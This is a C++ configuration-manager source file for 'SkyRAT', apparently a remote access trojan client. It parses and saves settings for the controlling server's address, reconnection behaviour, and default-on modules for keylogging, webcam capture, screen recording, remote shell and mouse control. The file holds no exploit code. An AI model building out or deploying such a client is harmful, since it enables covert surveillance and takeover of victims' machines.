#include "ConfigManager.h"
#include "../Utils/Utilities.h"
#include <fstream>
#include <iostream>
#include <sstream>
#include <algorithm>
#include <cctype>

namespace SkyRAT {
namespace Core {

    ConfigManager::ConfigManager() {
        setDefaultValues();
    }

    ConfigManager::~ConfigManager() = default;

    void ConfigManager::setDefaultValues() {
        std::cout << "[ConfigManager] Setting default configuration values" << std::endl;
        
        // Server connection settings
        m_config["server_ip"] = std::string("127.0.0.1");
        m_config["server_port"] = static_cast<uint16_t>(4545);
        
        // Network settings
        m_config["receive_buffer_size"] = 1024;
        m_config["connection_timeout"] = 5000; // milliseconds
        m_config["auto_reconnect"] = true;
        m_config["reconnect_interval"] = 3000; // milliseconds
        m_config["max_reconnect_attempts"] = 10;
        
        // Module settings (for future use)
        m_config["module_screenshot_enabled"] = true;
        m_config["module_keylogger_enabled"] = true;
        m_config["module_screen_recording_enabled"] = true;
        m_config["module_remote_shell_enabled"] = true;
        m_config["module_mouse_control_enabled"] = true;
        m_config["module_webcam_enabled"] = true;
        
        // Logging settings
        m_config["log_level"] = std::string("INFO");
        m_config["log_to_file"] = true;
        m_config["log_file_path"] = std::string("skyrat_client.log");
        
        std::cout << "[ConfigManager] Default values configured" << std::endl;
    }

    bool ConfigManager::loadFromFile(const std::string& configFile) {
        std::ifstream file(configFile);
        if (!file.is_open()) {
            std::cerr << "Warning: Could not open config file: " << configFile << std::endl;
            std::cerr << "Using default configuration values" << std::endl;
            return false;
        }

        std::string line;
        std::cout << "[ConfigManager] Loading configuration from: " << configFile << std::endl;
        
        while (std::getline(file, line)) {
            // Skip empty lines and comments
            line = Utils::StringUtils::trim(line);
            if (line.empty() || line[0] == '#' || line[0] == '/' || line[0] == ';') {
                continue;
            }
            
            // Parse key=value pairs
            size_t equalPos = line.find('=');
            if (equalPos != std::string::npos) {
                std::string key = Utils::StringUtils::trim(line.substr(0, equalPos));
                std::string value = Utils::StringUtils::trim(line.substr(equalPos + 1));
                
                // Remove quotes if present
                if (value.size() >= 2 && value[0] == '"' && value.back() == '"') {
                    value = value.substr(1, value.size() - 2);
                }
                
                parseAndSetValue(key, value);
            }
        }
        
        file.close();
        validateConfiguration();
        std::cout << "[ConfigManager] Configuration loaded successfully" << std::endl;
        return true;
    }

    bool ConfigManager::saveToFile(const std::string& configFile) const {
        std::ofstream file(configFile);
        if (!file.is_open()) {
            std::cerr << "Error: Could not create config file: " << configFile << std::endl;
            return false;
        }

        std::cout << "[ConfigManager] Saving configuration to: " << configFile << std::endl;
        
        // Write header
        file << "# SkyRAT Client Configuration File\n";
        file << "# Generated automatically - modify with caution\n";
        file << "\n";
        
        // Write server settings
        file << "# Server Connection Settings\n";
        file << "server_ip=" << getServerIP() << "\n";
        file << "server_port=" << getServerPort() << "\n";
        file << "\n";
        
        // Write connection settings
        file << "# Connection Settings\n";
        file << "receive_buffer_size=" << getReceiveBufferSize() << "\n";
        file << "connection_timeout=" << getConnectionTimeout() << "\n";
        file << "auto_reconnect=" << (getAutoReconnect() ? "true" : "false") << "\n";
        file << "reconnect_interval=" << getValue<int>("reconnect_interval", 3000) << "\n";
        file << "max_reconnect_attempts=" << getValue<int>("max_reconnect_attempts", 10) << "\n";
        file << "\n";
        
        // Write module settings (placeholder for future expansion)
        file << "# Module Settings\n";
        file << "# module_screenshot_enabled=true\n";
        file << "# module_keylogger_enabled=true\n";
        file << "# module_screen_recording_enabled=true\n";
        
        file.close();
        std::cout << "[ConfigManager] Configuration saved successfully" << std::endl;
        return true;
    }

    std::string ConfigManager::getServerIP() const {
        return getValue<std::string>("server_ip", "127.0.0.1");
    }

    uint16_t ConfigManager::getServerPort() const {
        return getValue<uint16_t>("server_port", 4545);
    }

    int ConfigManager::getReceiveBufferSize() const {
        return getValue<int>("receive_buffer_size", 1024);
    }

    int ConfigManager::getConnectionTimeout() const {
        return getValue<int>("connection_timeout", 5000);
    }

    bool ConfigManager::getAutoReconnect() const {
        return getValue<bool>("auto_reconnect", true);
    }

    void ConfigManager::setServerIP(const std::string& ip) {
        setValue("server_ip", ip);
    }

    void ConfigManager::setServerPort(uint16_t port) {
        setValue("server_port", port);
    }

    void ConfigManager::setReceiveBufferSize(int size) {
        setValue("receive_buffer_size", size);
    }

    void ConfigManager::setConnectionTimeout(int timeout) {
        setValue("connection_timeout", timeout);
    }

    void ConfigManager::setAutoReconnect(bool enable) {
        setValue("auto_reconnect", enable);
    }

    int ConfigManager::getReconnectInterval() const {
        return getValue<int>("reconnect_interval", 3000);
    }

    int ConfigManager::getMaxReconnectAttempts() const {
        return getValue<int>("max_reconnect_attempts", 10);
    }

    void ConfigManager::setReconnectInterval(int interval) {
        setValue("reconnect_interval", interval);
    }

    void ConfigManager::setMaxReconnectAttempts(int attempts) {
        setValue("max_reconnect_attempts", attempts);
    }

    bool ConfigManager::createDefaultConfig(const std::string& configFile) const {
        std::cout << "[ConfigManager] Creating default configuration file: " << configFile << std::endl;
        return saveToFile(configFile);
    }

    void ConfigManager::validateConfiguration() {
        // Validate server IP
        std::string ip = getServerIP();
        if (ip.empty()) {
            std::cerr << "Warning: Empty server IP, using default" << std::endl;
            setServerIP("127.0.0.1");
        }

        // Validate server port
        uint16_t port = getServerPort();
        if (port == 0) {
            std::cerr << "Warning: Invalid server port, using default" << std::endl;
            setServerPort(4545);
        }

        // Validate buffer size
        int bufferSize = getReceiveBufferSize();
        if (bufferSize <= 0 || bufferSize > 65536) {
            std::cerr << "Warning: Invalid buffer size, using default" << std::endl;
            setReceiveBufferSize(1024);
        }
    }

    void ConfigManager::parseAndSetValue(const std::string& key, const std::string& value) {
        std::cout << "[ConfigManager] Setting " << key << " = " << value << std::endl;
        
        // Handle different value types based on key patterns
        if (key == "server_port" || key == "receive_buffer_size" || 
            key == "connection_timeout" || key == "reconnect_interval" || 
            key == "max_reconnect_attempts") {
            try {
                int intValue = std::stoi(value);
                if (key == "server_port") {
                    m_config[key] = static_cast<uint16_t>(intValue);
                } else {
                    m_config[key] = intValue;
                }
            } catch (const std::exception&) {
                std::cerr << "Warning: Invalid integer value for " << key << ": " << value << std::endl;
            }
        }
        else if (key == "auto_reconnect") {
            std::string lowerValue = Utils::StringUtils::toLower(value);
            m_config[key] = (lowerValue == "true" || lowerValue == "1" || lowerValue == "yes");
        }
        else {
            // Default to string
            m_config[key] = value;
        }
    }

} // namespace Core
} // namespace SkyRAT